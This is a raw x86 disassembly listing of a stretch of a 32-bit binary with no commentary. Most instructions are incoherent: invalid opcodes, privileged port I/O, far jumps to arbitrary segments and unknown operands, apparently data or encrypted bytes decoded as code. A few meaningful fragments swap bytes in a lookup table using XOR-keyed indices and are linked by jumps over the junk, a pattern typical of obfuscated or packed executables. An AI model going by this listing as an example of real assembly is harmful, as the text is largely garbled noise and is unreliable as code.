  40c237:	sub    edi,ecx
  40c239:	or     edi,edi
  40c23b:	fmul   QWORD PTR [ebx+esi*8-0x7400e15b]
  40c242:	jg     0x40c2af
  40c244:	ffreep st(2)
  40c246:	mov    ebx,0xb9f3beb9
  40c24b:	stos   DWORD PTR es:[edi],eax
  40c24c:	stos   DWORD PTR es:[edi],eax
  40c24d:	nop
  40c24e:	pusha  
  40c24f:	xor    eax,0x2caeacf7
  40c254:	mov    DWORD PTR ds:0x782259fa,eax
  40c25a:	push   ebx
  40c25b:	sbb    eax,0xe972489a
  40c260:	xor    eax,0x325f8fa4
  40c265:	sti    
  40c266:	jnp    0x40c29c
  40c268:	ror    BYTE PTR [eax+edx*1],0x97
  40c26c:	xor    eax,0x90b88fbb
  40c271:	mov    edx,0xd433102c
  40c276:	retf   0x5081
  40c279:	out    0x17,eax
  40c27b:	add    edi,DWORD PTR [ebp-0x1d]
  40c27e:	xor    bh,ah
  40c280:	mov    esp,0xb6088708
  40c285:	pop    ebx
  40c286:	les    esi,FWORD PTR [eax+0x285c241d]
  40c28c:	jae    0x40c30c
  40c28e:	jge    0x40c2ab
  40c290:	add    ebx,eax
  40c292:	or     DWORD PTR [esi+0x487766e9],0x1c
  40c299:	sub    al,0xf8
  40c29b:	sub    BYTE PTR [esi+edi*1-0x16f993bf],dh
  40c2a2:	mov    WORD PTR [edx+0x3e6ea93f],ss
  40c2a8:	mov    bh,0xfb
  40c2aa:	sbb    al,0x7c
  40c2ac:	mov    ebx,0xccd1265a
  40c2b1:	dec    edi
  40c2b2:	les    esp,FWORD PTR ds:0x6ed3d6f3
  40c2b8:	cwde   
  40c2b9:	xor    BYTE PTR [ebp+0x1ed0262a],0xc1
  40c2c0:	push   edi
  40c2c1:	push   0x5
  40c2c3:	sbb    eax,0xc8dd2ced
  40c2c8:	sub    ecx,DWORD PTR [ecx+esi*8+0x16]
  40c2cc:	jbe    0x40c318
  40c2ce:	mov    ?,ebx
  40c2d0:	enter  0x9a01,0xa2
  40c2d4:	dec    esi
  40c2d5:	jne    0x40c353
  40c2d7:	push   eax
  40c2d8:	dec    edx
  40c2d9:	jae    0x40c339
  40c2db:	cmp    BYTE PTR ds:0xae7a283b,cl
  40c2e1:	addr16 ret 
  40c2e3:	cld    
  40c2e4:	cld    
  40c2e5:	cmp    DWORD PTR es:[ebp-0x74631c6d],edi
  40c2ec:	jmp    0x40c2c0
  40c2ee:	mov    ah,0xd2
  40c2f0:	daa    
  40c2f1:	xor    al,cl
  40c2f3:	jns    0x40c335
  40c2f5:	push   ebp
  40c2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2f7:	stos   BYTE PTR es:[edi],al
  40c2f8:	(bad)  [edx+0x6752b941]
  40c2fe:	dec    eax
  40c2ff:	xchg   DWORD PTR [esi],edi
  40c301:	push   0x2c
  40c303:	xor    DWORD PTR [eax+0x76],ebp
  40c306:	jns    0x40c373
  40c308:	cld    
  40c309:	daa    
  40c30a:	dec    edx
  40c30b:	add    eax,ebx
  40c30d:	or     ah,BYTE PTR [ebp+0x50e268b6]
  40c313:	jle    0x40c2b4
  40c315:	aas    
  40c316:	xchg   dl,bh
  40c318:	mov    al,ds:0x98a0ed47
  40c31d:	iret   
  40c31e:	lds    ecx,FWORD PTR [ecx-0x150a1be9]
  40c324:	popf   
  40c325:	and    eax,0x7fed86d5
  40c32a:	xor    esp,DWORD PTR ds:0xba699a6a
  40c330:	(bad)  
  40c331:	into   
  40c332:	sti    
  40c333:	es add al,0x91
  40c336:	inc    ecx
  40c337:	xchg   esi,eax
  40c338:	jae    0x40c2d3
  40c33a:	mov    fs,WORD PTR [esi]
  40c33c:	sbb    DWORD PTR [edx-0x6b],0x5d49aa00
  40c343:	(bad)  
  40c344:	mov    ecx,0x2837a48f
  40c349:	xor    al,0x4
  40c34b:	hlt    
  40c34c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c34d:	mov    dh,0x1e
  40c34f:	pop    ecx
  40c350:	xchg   BYTE PTR ds:0xf8d94f99,ah
  40c356:	fucomip st,st(7)
  40c358:	dec    edi
  40c359:	shr    DWORD PTR [ebx-0x48],cl
  40c35c:	inc    ecx
  40c35d:	mov    ?,ecx
  40c35f:	push   ebp
  40c360:	xchg   ecx,eax
  40c361:	addr16 mov esi,ebx
  40c364:	mov    ecx,0xa48c9800
  40c369:	out    dx,al
  40c36a:	push   esp
  40c36b:	rcl    DWORD PTR [ebp-0x346a18cb],0xb7
  40c372:	mov    bh,0x94
  40c374:	or     BYTE PTR [edi-0x80],bl
  40c377:	aad    0x33
  40c379:	push   esp
  40c37a:	jge    0x40c30f
  40c37c:	mov    esp,0x4cb2ee5
  40c381:	scas   al,BYTE PTR es:[edi]
  40c382:	nop
  40c383:	das    
  40c384:	sub    DWORD PTR [edx],edi
  40c386:	fild   QWORD PTR [ebp+0x27395cd4]
  40c38c:	lock loope 0x40c3c5
  40c38f:	loope  0x40c37f
  40c391:	jb     0x40c32a
  40c393:	cmp    al,dl
  40c395:	xchg   al,ah
  40c397:	jmp    0x8075:0x3ea599fb
  40c39e:	call   0xa2ec:0x399aea51
  40c3a5:	cmp    bl,0x2f
  40c3a8:	ss pop ss
  40c3aa:	sbb    edi,DWORD PTR [esp+edx*1+0x7d]
  40c3ae:	std    
  40c3af:	adc    al,BYTE PTR [edi-0x71]
  40c3b2:	adc    dh,BYTE PTR [eax]
  40c3b4:	sub    eax,0x13ae56fa
  40c3b9:	fmulp  st(4),st
  40c3bb:	mov    DWORD PTR [esi],edi
  40c3bd:	adc    esi,eax
  40c3bf:	mov    dl,0xef
  40c3c1:	push   edx
  40c3c2:	xor    ebp,esi
  40c3c4:	in     al,dx
  40c3c5:	pop    es
  40c3c6:	(bad)  
  40c3c7:	pop    ds
  40c3c8:	stos   DWORD PTR es:[edi],eax
  40c3c9:	stos   BYTE PTR es:[edi],al
  40c3ca:	dec    eax
  40c3cb:	cld    
  40c3cc:	rol    DWORD PTR [edi+0x1f097bee],cl
  40c3d2:	(bad)  
  40c3d3:	call   0x2da5490b
  40c3d8:	jmp    0x40c3bc
  40c3da:	push   ebx
  40c3db:	xchg   edx,eax
  40c3dc:	pop    edx
  40c3dd:	lahf   
  40c3de:	stos   DWORD PTR es:[edi],eax
  40c3df:	xchg   esp,eax
  40c3e0:	arpl   WORD PTR [edx],ax
  40c3e2:	and    eax,0x9498d18f
  40c3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e8:	popf   
  40c3e9:	fdivr  DWORD PTR [ebx]
  40c3eb:	(bad)  
  40c3ec:	clc    
  40c3ed:	add    DWORD PTR [ecx],esi
  40c3ef:	and    esp,DWORD PTR [eax]
  40c3f1:	add    eax,0x1041fe34
  40c3f6:	outs   dx,DWORD PTR ds:[esi]
  40c3f7:	mov    WORD PTR [edi+0x33],?
  40c3fa:	add    BYTE PTR [eax],bh
  40c3fc:	ss (bad) 
  40c3fe:	mov    eax,ds:0x1039bd0
  40c403:	pop    ds
  40c404:	ds iret 
  40c406:	dec    edx
  40c407:	scas   eax,DWORD PTR es:[edi]
  40c408:	add    DWORD PTR [ebp-0x5fc6f5bc],eax
  40c40e:	jno    0x40c3c5
  40c410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c411:	arpl   dx,bx
  40c413:	pop    DWORD PTR [esi]
  40c415:	add    cl,al
  40c417:	jmp    0x124d:0x97254575
  40c41e:	int3   
  40c41f:	dec    esi
  40c420:	and    esp,DWORD PTR [ebp-0x14]
  40c423:	cmp    eax,0xf5979215
  40c428:	(bad)  [eax-0x34c53113]
  40c42e:	mov    ds:0x86e4c14d,al
  40c433:	pop    ecx
  40c434:	dec    ebp
  40c435:	aad    0xb5
  40c437:	xor    BYTE PTR [eax],bh
  40c439:	sbb    eax,0xf56bf0ce
  40c43e:	dec    ebx
  40c43f:	jae    0x40c4a9
  40c441:	pop    ebx
  40c442:	and    dh,BYTE PTR [ebx+0x5b]
  40c445:	mov    edx,0x3fcc2727
  40c44a:	jo     0x40c428
  40c44c:	adc    eax,0x535df8ec
  40c451:	mov    al,0x87
  40c453:	retf   0x1796
  40c456:	mov    ebp,0x3a8d7b87
  40c45b:	sub    DWORD PTR [ebx+0x64],0xb742e2a8
  40c462:	stc    
  40c463:	jo     0x40c476
  40c465:	cmp    al,ch
  40c467:	or     DWORD PTR [eax+esi*8+0x51],ecx
  40c46b:	mov    al,0x85
  40c46d:	adc    ebp,DWORD PTR [esi]
  40c46f:	fld    DWORD PTR [edi-0x45]
  40c472:	lods   al,BYTE PTR ds:[esi]
  40c473:	dec    edi
  40c474:	pop    esp
  40c475:	mov    ?,ebp
  40c477:	pop    edi
  40c478:	adc    cl,BYTE PTR [edi]
  40c47a:	pop    edx
  40c47b:	in     eax,dx
  40c47c:	hlt    
  40c47d:	push   edi
  40c47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47f:	or     al,0x8b
  40c481:	test   al,0xb
  40c483:	sub    al,0x55
  40c485:	std    
  40c486:	push   ss
  40c487:	into   
  40c488:	xchg   esi,eax
  40c489:	imul   ecx,DWORD PTR [ebx+0x9],0x5e5e5dba
  40c490:	in     eax,0x22
  40c492:	jl     0x40c47c
  40c494:	lea    ecx,[ebx-0x40]
  40c497:	rcl    BYTE PTR [edi+0x5a],0xd8
  40c49b:	lods   eax,DWORD PTR ds:[esi]
  40c49c:	lds    ebp,FWORD PTR [ecx+0x24]
  40c49f:	and    esp,ecx
  40c4a1:	leave  
  40c4a2:	pop    ecx
  40c4a3:	inc    ecx
  40c4a4:	or     bh,BYTE PTR [edx+0x6738f720]
  40c4aa:	stc    
  40c4ab:	push   esp
  40c4ac:	mov    ch,BYTE PTR [esi+ecx*8]
  40c4af:	xlat   BYTE PTR ds:[ebx]
  40c4b0:	fs jl  0x40c447
  40c4b3:	jmp    0xf5ee55da
  40c4b8:	push   ebx
  40c4b9:	cmp    eax,0xf0f4946b
  40c4be:	cwde   
  40c4bf:	pop    es
  40c4c0:	enter  0x26cd,0x8e
  40c4c4:	cs nop
  40c4c6:	(bad)  
  40c4c7:	call   0x5f5f6c14
  40c4cc:	sub    DWORD PTR gs:[eax+eiz*2+0x440d6fbc],0x19160603
  40c4d8:	nop
  40c4d9:	jns    0x40c48b
  40c4db:	sub    al,BYTE PTR ds:0x5414ff8a
  40c4e1:	(bad)  
  40c4e2:	or     eax,0x83561cce
  40c4e7:	xor    BYTE PTR [eax],bh
  40c4e9:	add    al,0x4d
  40c4eb:	hlt    
  40c4ec:	push   ebx
  40c4ed:	push   ds
  40c4ee:	cmp    al,0x4e
  40c4f0:	das    
  40c4f1:	pop    es
  40c4f2:	jg     0x40c48d
  40c4f4:	or     cl,BYTE PTR [ebp+0x708c114c]
  40c4fa:	scas   eax,DWORD PTR es:[edi]
  40c4fb:	pop    es
  40c4fc:	sar    DWORD PTR [ecx],1
  40c4fe:	add    edx,DWORD PTR [eax+0x13]
  40c501:	adc    eax,0x10c190fb
  40c506:	push   esi
  40c507:	mul    BYTE PTR [ebp-0x9f842a1]
  40c50d:	je     0x40c520
  40c50f:	leave  
  40c510:	lods   al,BYTE PTR ds:[esi]
  40c511:	cld    
  40c512:	lock popa 
  40c514:	cmp    eax,0x2f304fe
  40c519:	or     eax,ebp
  40c51b:	sub    ebp,0x6ca72afa
  40c521:	lahf   
  40c522:	add    BYTE PTR [ebx],ah
  40c524:	hlt    
  40c525:	pop    ebp
  40c526:	adc    ecx,DWORD PTR ds:0x7d8c817e
  40c52c:	div    DWORD PTR [ebx+0x59]
  40c52f:	mov    bl,0xd4
  40c531:	dec    ebx
  40c532:	push   ds
  40c533:	xchg   ebx,eax
  40c534:	in     eax,dx
  40c535:	pop    ebp
  40c536:	xchg   BYTE PTR [ebp+0x57],cl
  40c539:	ins    DWORD PTR es:[edi],dx
  40c53a:	cmovs  edx,DWORD PTR [ebp-0x410c35cf]
  40c541:	mov    edx,DWORD PTR [ebp-0x18]
  40c544:	xor    edx,eax
  40c546:	add    edx,DWORD PTR [ebp-0x14]
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0xce69733d,si
  40c55e:	adc    ah,BYTE PTR [edi]
  40c560:	mov    al,0x97
  40c562:	xchg   ebp,eax
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c518
  40c56a:	je     0x40c56f
  40c56c:	outs   dx,BYTE PTR ds:[esi]
  40c56d:	mov    bl,0x70
  40c56f:	call   0xb2c7:0x3c8bb58e
  40c576:	cmp    ah,BYTE PTR [ebx+ebx*4]
  40c579:	sbb    ebx,DWORD PTR [edi-0x72216a0c]
  40c57f:	loop   0x40c547
  40c581:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40c583:	pop    DWORD PTR [eax-0x4]
  40c586:	gs mov cl,0xc0
  40c589:	push   ebp
  40c58a:	loop   0x40c510
  40c58c:	mov    al,BYTE PTR [ecx+0x4d0f078]
  40c592:	jmp    0x40c55c
  40c594:	and    eax,0x94a4133e
  40c599:	in     al,dx
  40c59a:	adc    ch,cl
  40c59c:	xchg   ah,dh
  40c59e:	pop    ebp
  40c59f:	or     esp,ebx
  40c5a1:	ds inc esp
  40c5a3:	cmp    DWORD PTR [ebx+0x4ce69891],ebp
  40c5a9:	out    dx,al
  40c5aa:	and    ebp,ebp
  40c5ac:	fwait
  40c5ad:	gs jns 0x40c607
  40c5b0:	push   edi
  40c5b1:	push   0xfca064a1
  40c5b6:	mov    al,0xa2
  40c5b8:	pop    esp
  40c5b9:	les    ebx,FWORD PTR [edi-0x48]
  40c5bc:	in     eax,0x60
  40c5be:	xchg   BYTE PTR [eax+0x361531ac],dl
  40c5c4:	ret    0x42f8
  40c5c7:	shl    BYTE PTR [edi+0x58],cl
  40c5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5cb:	push   ds
  40c5cc:	lds    esp,FWORD PTR [ebx]
  40c5ce:	sbb    BYTE PTR [esi],bh
  40c5d0:	dec    ebp
  40c5d1:	add    BYTE PTR [ecx],dl
  40c5d3:	mov    eax,ds:0x2dc7f580
  40c5d8:	(bad)  
  40c5d9:	xchg   edx,eax
  40c5da:	pop    es
  40c5db:	push   ds
  40c5dc:	mov    dh,0xb4
  40c5de:	pop    es
  40c5df:	inc    ebp
  40c5e0:	nop
  40c5e1:	fadd   QWORD PTR [eax]
  40c5e3:	iret   
  40c5e4:	aas    
  40c5e5:	outs   dx,DWORD PTR ds:[esi]
  40c5e6:	inc    esi
  40c5e7:	icebp  
  40c5e8:	loope  0x40c62a
  40c5ea:	push   eax
  40c5eb:	test   eax,0x6fa58391
  40c5f0:	imul   DWORD PTR [ebp+0x1c]
  40c5f3:	pop    edi
  40c5f4:	shl    eax,cl
  40c5f6:	retf   0x270a
  40c5f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5fa:	xchg   ebx,eax
  40c5fb:	stos   BYTE PTR es:[edi],al
  40c5fc:	or     DWORD PTR [esi+eiz*1+0x74],0x7c
  40c601:	mov    esi,0x2c57d422
  40c606:	dec    ecx
  40c607:	jne    0x40c5ae
  40c609:	pop    edi
  40c60a:	enter  0x7e46,0x55
  40c60e:	out    dx,al
  40c60f:	lock xchg esp,eax
  40c611:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c613:	div    DWORD PTR [esi]
  40c615:	xchg   esp,eax
  40c616:	jg     0x40c621
  40c618:	mov    eax,ds:0x1f02e4f8
  40c61d:	lods   al,BYTE PTR ds:[esi]
  40c61e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c61f:	adc    al,0x94
  40c621:	icebp  
  40c622:	mov    esi,0x72141e5b
  40c627:	inc    edx
  40c628:	(bad)  
  40c629:	mov    WORD PTR [ecx-0x2a9ecab0],cs
  40c62f:	outs   dx,DWORD PTR ds:[esi]
  40c630:	fisttp WORD PTR [eax-0x11]
  40c633:	xchg   ecx,eax
  40c634:	push   ebp
  40c635:	pop    edi
  40c636:	xchg   ebp,eax
  40c637:	sub    ecx,ebp
  40c639:	cmc    
  40c63a:	sub    DWORD PTR [ecx+0x488987b8],edx
  40c640:	loop   0x40c673
  40c642:	sub    DWORD PTR [ebx-0x67],edi
  40c645:	pop    ecx
  40c646:	fs xchg edx,eax
  40c648:	dec    ebx
  40c649:	popa   
  40c64a:	pop    ss
  40c64b:	fwait
  40c64c:	add    eax,0xeddb620a
  40c651:	xor    eax,DWORD PTR [ebp+0x44b8cb03]
  40c657:	or     eax,0x1c40a2e1
  40c65d:	(bad)  
  40c65e:	dec    ebp
  40c65f:	out    dx,eax
  40c660:	or     cl,cl
  40c662:	xlat   BYTE PTR ds:[ebx]
  40c663:	and    dh,BYTE PTR [edx-0x4b3f8c6d]
  40c669:	pusha  
  40c66a:	sub    eax,0xdc64c4d4
  40c66f:	ins    BYTE PTR es:[edi],dx
  40c670:	aas    
  40c671:	push   0xffffff9e
  40c673:	sub    edi,ebx
  40c675:	outs   dx,BYTE PTR ds:[esi]
  40c676:	xchg   edx,eax
  40c677:	dec    ebp
  40c678:	je     0x40c6f1
  40c67a:	scas   eax,DWORD PTR es:[edi]
  40c67b:	push   0x2724b6d5
  40c680:	inc    edx
  40c681:	into   
  40c682:	fnstenv [ebx]
  40c684:	sub    al,0x5f
  40c686:	jo     0x40c6f2
  40c688:	pop    edx
  40c689:	out    dx,al
  40c68a:	repnz mov cl,0x79
  40c68d:	outs   dx,BYTE PTR ds:[esi]
  40c68e:	push   edx
  40c68f:	fsub   QWORD PTR [ebx+0x63]
  40c692:	popa   
  40c693:	pop    eax
  40c694:	and    bh,BYTE PTR [eax]
  40c696:	or     edx,DWORD PTR [ebx+0x72]
  40c699:	xchg   ebx,eax
  40c69a:	jmp    0x2029:0x5845f5b6
  40c6a1:	leave  
  40c6a2:	in     al,dx
  40c6a3:	mov    edi,DWORD PTR [ebx+ebp*4]
  40c6a6:	mov    BYTE PTR [ebp+ecx*1-0x608c4b2c],ch
  40c6ad:	arpl   WORD PTR [ebx],di
  40c6af:	and    cl,bl
  40c6b1:	xor    ebx,ebx
  40c6b3:	push   cs
  40c6b4:	push   esi
  40c6b5:	retf   0xba3d
  40c6b8:	mov    WORD PTR [edx],gs
  40c6ba:	xchg   ebx,eax
  40c6bb:	in     al,0x9e
  40c6bd:	xchg   ecx,eax
  40c6be:	cli    
  40c6bf:	jmp    0x583b6fdf
  40c6c4:	and    BYTE PTR [eax-0x1be286e8],ch
  40c6ca:	data16 mov ds:0x2fd59c2b,al
  40c6d0:	in     eax,dx
  40c6d1:	add    al,0x64
  40c6d3:	es jmp 0x6ac:0x2b47b893
  40c6db:	mov    ah,0x2d
  40c6dd:	or     al,0x5d
  40c6df:	rcl    DWORD PTR [ebp+0x66],cl
  40c6e2:	shl    DWORD PTR [edi+0x7e],1
  40c6e5:	cmp    eax,0x4368ecc
  40c6ea:	out    dx,eax
  40c6eb:	sub    ecx,ecx
  40c6ed:	popf   
  40c6ee:	test   eax,0xe0263bce
  40c6f3:	cmp    BYTE PTR [esi-0x336b4170],bl
  40c6f9:	mov    bh,0xb3
  40c6fb:	xchg   ecx,eax
  40c6fc:	sub    eax,0x8d14b049
  40c701:	dec    ebx
  40c702:	cli    
  40c703:	adc    cl,0xa9
  40c706:	data16 hlt 
  40c708:	add    bh,ch
  40c70a:	inc    edi
  40c70b:	cmc    
  40c70c:	or     ah,dl
  40c70e:	das    
  40c70f:	mov    ch,0x7
  40c711:	test   eax,0x2e7fee5a
  40c716:	pop    edi
  40c717:	cmp    ebx,DWORD PTR [ecx]
  40c719:	fisubr WORD PTR [ecx-0x38]
  40c71c:	lods   al,BYTE PTR ds:[esi]
  40c71d:	imul   ebp,DWORD PTR [ecx],0x79
  40c720:	add    dl,BYTE PTR [edi+0x5d354cca]
  40c726:	test   BYTE PTR [ebp+0x1d],cl
  40c729:	cmp    DWORD PTR [ebp+0x370e6d47],ebp
  40c72f:	push   cs
  40c730:	add    eax,edi
  40c732:	test   bh,ch
  40c734:	sbb    eax,0xa6961df7
  40c739:	adc    eax,0xfff6b1ca
  40c73e:	shl    BYTE PTR [edx+0x48ac1a87],cl
  40c744:	sbb    eax,0x24ff70a3
  40c749:	push   0xcc482557
  40c74e:	ret    
  40c74f:	sub    BYTE PTR [esi],0xa0
  40c752:	ret    
  40c753:	lods   eax,DWORD PTR ds:[esi]
  40c754:	push   eax
  40c755:	push   0xffffff93
  40c757:	xchg   esp,eax
  40c758:	into   
  40c759:	xchg   ebp,eax
  40c75a:	dec    edi
  40c75b:	pop    eax
  40c75c:	jp     0x40c6f0
  40c75e:	cmp    dl,BYTE PTR [ecx]
  40c760:	js     0x40c761
  40c762:	je     0x40c6e5
  40c764:	pushf  
  40c765:	inc    esp
  40c766:	jle    0x40c733
  40c768:	ss mov al,0x95
  40c76b:	and    eax,0x4977eb2a
  40c770:	test   eax,0xd41f60d4
  40c775:	aad    0x3b
  40c777:	push   ss
  40c778:	repz in eax,0x25
  40c77b:	loopne 0x40c71e
  40c77d:	je     0x40c7d5
  40c77f:	lock fsubp st(3),st
  40c782:	gs pop ecx
  40c784:	sub    edi,DWORD PTR [ecx]
  40c786:	lahf   
  40c787:	out    0xdf,eax
  40c789:	inc    ecx
  40c78a:	cmp    edx,esp
  40c78c:	sbb    ebx,DWORD PTR [esi+0x57]
  40c78f:	inc    ebp
  40c790:	clc    
  40c791:	mov    dl,0x4b
  40c793:	push   es
  40c794:	jb     0x40c744
  40c796:	xchg   edi,eax
  40c797:	sbb    DWORD PTR [esi],0xfcc6878f
  40c79d:	xchg   cl,cl
  40c79f:	mov    BYTE PTR [ebx-0x13],bh
  40c7a2:	xchg   esi,esi
  40c7a4:	daa    
  40c7a5:	test   al,0xdf
  40c7a7:	repnz cld 
  40c7a9:	xor    dh,BYTE PTR [edi-0xac1f894]
  40c7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b0:	dec    eax
  40c7b1:	cmc    
  40c7b2:	push   ss
  40c7b3:	sub    dh,bh
  40c7b5:	js     0x40c767
  40c7b7:	add    edx,DWORD PTR [edx-0x3b]
  40c7ba:	mov    esi,0xf9d425a1
  40c7bf:	in     al,0x11
  40c7c1:	ror    dh,1
  40c7c3:	mov    bl,cl
  40c7c5:	xchg   esi,eax
  40c7c6:	push   eax
  40c7c7:	jge    0x40c77a
  40c7c9:	(bad)  
  40c7ca:	retf   0x389c
  40c7cd:	xor    al,bh
  40c7cf:	icebp  
  40c7d0:	jne    0x40c790
  40c7d2:	push   ss
  40c7d3:	mov    ebx,0x7d67dc73
  40c7d8:	mov    al,ds:0xad5b5873
  40c7dd:	xchg   edi,eax
  40c7de:	(bad)  [esi+0x5d]
  40c7e1:	xlat   BYTE PTR ds:[ebx]
  40c7e2:	inc    ecx
  40c7e3:	mul    BYTE PTR [edi-0x5e59711e]
  40c7e9:	jge    0x40c81c
  40c7eb:	pop    edx
  40c7ec:	jnp    0x40c7d7
  40c7ee:	imul   DWORD PTR [ebp-0x4c]
  40c7f1:	into   
  40c7f2:	mov    ebp,0x6f19f93f
  40c7f7:	ficom  DWORD PTR [ecx+0x3c]
  40c7fa:	sbb    ecx,DWORD PTR [edx-0x15040c9e]
  40c800:	cmp    dl,dh
  40c802:	sbb    esi,edi
  40c804:	mov    ebx,DWORD PTR fs:[ecx+0x79]
  40c808:	mov    al,0xbc
  40c80a:	adc    eax,0xbff05efe
  40c80f:	pop    eax
  40c810:	out    0x0,al
  40c812:	push   ecx
  40c813:	dec    ecx
  40c814:	jecxz  0x40c7d2
  40c816:	or     dh,ch
  40c818:	xchg   ebp,eax
  40c819:	sub    al,BYTE PTR [edi+eax*1]
  40c81c:	call   0xdb253bc2
  40c821:	fbstp  TBYTE PTR [esi]
  40c823:	retf   
  40c824:	out    0x4f,eax
  40c826:	xor    al,0x73
  40c828:	pop    edi
  40c829:	inc    ebx
  40c82a:	push   edi
  40c82b:	pop    eax
  40c82c:	jbe    0x40c7dd
  40c82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82f:	pusha  
  40c830:	sbb    bh,dh
  40c832:	add    DWORD PTR [edx-0x34980071],esi
  40c838:	aas    
  40c839:	adc    ah,al
  40c83b:	mov    al,ds:0xa3761ff0
  40c840:	in     eax,dx
  40c841:	mov    WORD PTR [edx+0x54],gs
  40c844:	fucomp st(4)
  40c846:	or     eax,0x8199f09
  40c84b:	fmul   st(3),st
  40c84d:	retf   0x2ad0
  40c850:	add    al,cl
  40c852:	push   es
  40c853:	push   0xffffff8a
  40c855:	xor    esi,DWORD PTR [esi-0xed6083b]
  40c85b:	shl    BYTE PTR [esi],cl
  40c85d:	pop    esp
  40c85e:	jbe    0x40c7fe
  40c860:	dec    ecx
  40c861:	jnp    0x40c8d8
  40c863:	int3   
  40c864:	jl     0x40c827
  40c866:	jmp    0x572b:0x127bfbf7
  40c86d:	mov    eax,0x47d5ac18
  40c872:	addr16 push ebx
  40c874:	adc    eax,eax
  40c876:	xchg   esi,eax
  40c877:	cmpps  xmm6,xmm0,0x3f
  40c87b:	mov    esp,0xd94b17c0
  40c880:	add    bh,BYTE PTR [eax]
  40c882:	cmp    DWORD PTR cs:[edx+0x15],esp
  40c886:	scas   al,BYTE PTR es:[edi]
  40c887:	mov    esp,0xf8b7009
  40c88c:	in     eax,0x60
  40c88e:	rcl    DWORD PTR [eax],1
  40c890:	cmp    eax,0x74a1900f
  40c895:	mov    dh,0x89
  40c897:	xchg   DWORD PTR ss:[ebp*1-0x192581e0],edi
  40c89f:	(bad)  
  40c8a0:	mov    ebx,0x59d2de9a
  40c8a5:	aas    
  40c8a6:	sub    eax,DWORD PTR [eax-0x7e]
  40c8a9:	cld    
  40c8aa:	(bad)  
  40c8ab:	rcr    DWORD PTR [esi],0xfc
  40c8ae:	rcl    DWORD PTR [esi-0x7a],cl
  40c8b1:	jb     0x40c90b
  40c8b3:	pop    ebx
  40c8b4:	scas   eax,DWORD PTR es:[edi]
  40c8b5:	cmc    
  40c8b6:	mov    WORD PTR [ecx+0x250e5498],?
  40c8bc:	hlt    
  40c8bd:	repnz out dx,al
  40c8bf:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	rcl    DWORD PTR es:[ebp-0x58],1
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c934
  40c930:	jmp    0x40c8ee
  40c932:	fsub   QWORD PTR [ebx]
  40c934:	mov    al,0x1a
  40c936:	xchg   esp,eax
  40c937:	dec    eax
  40c938:	les    esi,FWORD PTR [ecx-0x122d00d8]
  40c93e:	ins    BYTE PTR es:[edi],dx
  40c93f:	pop    ebp
  40c940:	ins    DWORD PTR es:[edi],dx
  40c941:	xor    al,0xa4
  40c943:	mov    ebx,0x9cf154bf
  40c948:	dec    DWORD PTR [ecx+ecx*4]
  40c94b:	mov    ch,0x7e
  40c94d:	jae    0x40c8da
  40c94f:	mov    dl,0x58
  40c951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c953:	inc    esi
  40c954:	sbb    ebx,ebx
  40c956:	xor    al,0x26
  40c958:	jl     0x40c969
  40c95a:	jnp    0x40c99c
  40c95c:	sahf   
  40c95d:	rcl    DWORD PTR [esi-0x7d],cl
  40c960:	xchg   ch,al
  40c962:	adc    al,BYTE PTR [esi-0x2d22f012]
  40c968:	pop    ebp
  40c969:	mov    ah,0xd0
  40c96b:	pop    edx
  40c96c:	jmp    FWORD PTR [esi+ebx*1-0xc]
  40c970:	repnz push 0x6a
  40c973:	in     al,0xdd
  40c975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c976:	and    BYTE PTR [ecx],cl
